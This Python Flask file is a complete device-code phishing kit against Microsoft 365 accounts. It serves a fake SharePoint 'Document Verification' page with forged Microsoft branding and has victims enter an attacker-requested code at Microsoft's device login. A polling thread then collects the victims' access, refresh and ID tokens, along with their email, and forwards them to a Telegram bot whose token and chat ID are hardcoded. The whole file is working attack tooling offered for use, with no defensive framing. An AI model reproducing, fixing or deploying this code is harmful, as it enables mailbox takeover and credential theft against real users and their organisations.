import os
import time
import sqlite3
import threading
import base64
import json
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
CHAT_ID = "8877118461"
DB_PATH = "/tmp/phish.db"

# Rotation of first-party client IDs
CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
    "268761a2-03f3-40df-8a8b-c3db24145b6b",  # OneDrive
]
CLIENT_ID_INDEX = 0

# FIXED SCOPE: no .default mixed with resource scopes (fixes AADSTS70011)
SCOPE = ("offline_access openid profile email "
         "https://outlook.office.com/IMAP.AccessAsUser.All "
         "https://outlook.office.com/SMTP.Send "
         "https://outlook.office.com/Mail.Read")

def get_client_id():
    return CLIENT_IDS[CLIENT_ID_INDEX % len(CLIENT_IDS)]

def rotate_client_id():
    global CLIENT_ID_INDEX
    CLIENT_ID_INDEX += 1
    print(f"[ROTATE] Switched to client ID index {CLIENT_ID_INDEX}", flush=True)

# ---------- DB ----------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_code TEXT, user_code TEXT, client_id TEXT,
                  status TEXT, email TEXT, tokens TEXT,
                  created_at REAL, completed_at REAL)""")
    conn.commit()
    conn.close()

init_db()

def db():
    return sqlite3.connect(DB_PATH, timeout=30)

# ---------- Telegram ----------
def send_telegram(text):
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=15,
        )
        print(f"[TG] status={r.status_code}", flush=True)
        return r.status_code == 200
    except Exception as e:
        print(f"[TG] EXCEPTION: {e}", flush=True)
        return False

# ---------- Decode id_token ----------
def decode_id_token(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        return data.get("preferred_username") or data.get("upn") or data.get("email") or "unknown"
    except Exception as e:
        print(f"[JWT] decode failed: {e}", flush=True)
        return "unknown"

# ---------- Poll worker ----------
def poll_worker():
    print("[WORKER] poll_worker started", flush=True)
    while True:
        try:
            conn = db()
            c = conn.cursor()
            c.execute("SELECT id, device_code, client_id FROM sessions WHERE status='pending'")
            rows = c.fetchall()
            for sid, device_code, client_id in rows:
                r = requests.post(
                    "https://login.microsoftonline.com/common/oauth2/v2.0/token",
                    data={
                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                        "client_id": client_id,
                        "device_code": device_code,
                    },
                    timeout=15,
                )
                resp = r.json()
                if "error" in resp:
                    err = resp["error"]
                    if err == "authorization_pending":
                        continue
                    elif err == "expired_token":
                        c.execute("UPDATE sessions SET status='expired' WHERE id=?", (sid,))
                        conn.commit()
                        print(f"[WORKER] session {sid} expired", flush=True)
                    elif err == "authorization_declined":
                        c.execute("UPDATE sessions SET status='declined' WHERE id=?", (sid,))
                        conn.commit()
                    else:
                        print(f"[WORKER] session {sid} error: {err}", flush=True)
                    continue
                # SUCCESS
                tokens = resp
                email = decode_id_token(tokens.get("id_token", ""))
                at = tokens.get("access_token", "N/A")
                rt = tokens.get("refresh_token", "N/A")
                idt = tokens.get("id_token", "N/A")
                send_telegram(f"🎯 <b>New Catch!</b>\n\n📧 <b>Email:</b> {email}")
                send_telegram(f"<b>access_token:</b>\n<code>{at}</code>")
                send_telegram(f"<b>refresh_token:</b>\n<code>{rt}</code>")
                send_telegram(f"<b>id_token:</b>\n<code>{idt}</code>")
                print(f"[WORKER] session {sid} caught email={email}", flush=True)
                c.execute("UPDATE sessions SET status='done', email=?, tokens=?, completed_at=? WHERE id=?",
                          (email, json.dumps(tokens), time.time(), sid))
                conn.commit()
            conn.close()
        except Exception as e:
            print(f"[WORKER] loop error: {e}", flush=True)
        time.sleep(5)

def start_worker():
    t = threading.Thread(target=poll_worker, daemon=True)
    t.start()
    print("[WORKER] thread launched", flush=True)

# ---------- Landing Page (SharePoint verification style) ----------
LANDING = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Document Verification | SharePoint</title>
<style>
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;margin:0;background:#faf9f8}
.topbar{background:#ffffff;border-bottom:1px solid #e1dfdd;padding:14px 32px;display:flex;align-items:center}
.topbar svg{height:26px;margin-right:10px}
.topbar span{font-size:17px;font-weight:600;color:#323130}
.hero{background:#0364b8;color:#fff;padding:48px 32px;text-align:center}
.hero h1{margin:0;font-size:28px;font-weight:400}
.hero p{margin:10px 0 0;font-size:15px;opacity:.9}
.card{max-width:560px;margin:-28px auto 0;background:#fff;border:1px solid #e1dfdd;box-shadow:0 2px 6px rgba(0,0,0,.08);padding:36px;text-align:center;position:relative}
.codebox{background:#f3f2f1;border:1px solid #8a8886;padding:16px;font-size:30px;font-weight:600;letter-spacing:6px;margin:20px 0;color:#323130;user-select:all}
.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;font-size:15px;cursor:pointer;width:100%;font-family:inherit}
.btn:hover{background:#106ebe}
.note{font-size:13px;color:#605e5c;margin-top:18px;line-height:1.5}
.footer{max-width:560px;margin:24px auto;font-size:12px;color:#605e5c;text-align:center}
</style>
</head>
<body>
<div class="topbar">
  <svg viewBox="0 0 24 24" fill="#0364b8"><path d="M3 3h10v18H3V3zm12 4h6v14h-6V7z"/></svg>
  <span>SharePoint</span>
</div>
<div class="hero">
  <h1>Document Verification Required</h1>
  <p>Your shared document requires secure sign-in verification</p>
</div>
<div class="card">
  <p style="font-size:15px;color:#323130;margin:0 0 6px;">To verify your account, enter this code at</p>
  <p style="font-size:15px;font-weight:600;color:#0078d4;margin:0 0 12px;">https://microsoft.com/devicelogin</p>
  <div class="codebox" id="userCode">{{ user_code }}</div>
  <button class="btn" onclick="copyAndGo()">Copy Code &amp; Continue</button>
  <p class="note">This code expires in 15 minutes. Never share it with anyone outside your organization.</p>
</div>
<div class="footer">&copy; 2026 Microsoft Corporation. All rights reserved.</div>
<script>
function copyAndGo(){
  var code = document.getElementById('userCode').innerText.trim();
  function go(){ window.location.href = 'https://microsoft.com/devicelogin'; }
  if(navigator.clipboard && navigator.clipboard.writeText){
    navigator.clipboard.writeText(code).then(go, go);
  } else {
    var ta = document.createElement('textarea');
    ta.value = code; document.body.appendChild(ta);
    ta.select(); try{ document.execCommand('copy'); }catch(e){}
    document.body.removeChild(ta); go();
  }
}
</script>
</body>
</html>
"""

# ---------- Routes ----------
@app.route("/")
def index():
    global CLIENT_ID_INDEX
    init_db()

    device_data = None
    for attempt in range(len(CLIENT_IDS)):
        client_id = get_client_id()
        try:
            r = requests.post(
                "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
                data={"client_id": client_id, "scope": SCOPE},
                timeout=15,
            )
            if r.status_code == 200:
                device_data = r.json()
                break
            print(f"[INIT] client {client_id} failed: {r.status_code} {r.text[:150]}", flush=True)
            rotate_client_id()
        except Exception as e:
            print(f"[INIT] exception: {e}", flush=True)
            rotate_client_id()

    if not device_data:
        return "Service temporarily unavailable. Please refresh.", 503

    conn = db()
    conn.execute(
        "INSERT INTO sessions (device_code, user_code, client_id, status, created_at) VALUES (?,?,?,?,?)",
        (device_data["device_code"], device_data["user_code"], get_client_id(), "pending", time.time()),
    )
    conn.commit()
    conn.close()

    return render_template_string(LANDING, user_code=device_data["user_code"])

start_worker()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
